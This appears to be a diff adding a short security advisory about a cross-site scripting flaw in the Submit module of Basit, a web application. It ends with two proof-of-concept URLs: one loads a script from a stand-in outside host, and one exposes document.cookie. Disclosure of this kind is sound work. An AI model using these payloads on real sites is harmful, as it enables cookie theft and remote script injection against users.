@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/7139/info
+
+A cross-site scripting vulnerability has been reported for Basit. This vulnerability occurs due to insufficient sanitization of some user-supplied input. As a result of this deficiency an attacker may exploit the vulnerability by creating a specially crafted URL that includes malicious HTML code as URI parameters for Basit's Submit module.
+
+This may allow for theft of cookie-based authentication credentials and other attacks.
+
+http://target/modules/Submit/index.php?op=pre&title=<script%20src="http://othersite/code.js">test</script>
+http://target/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
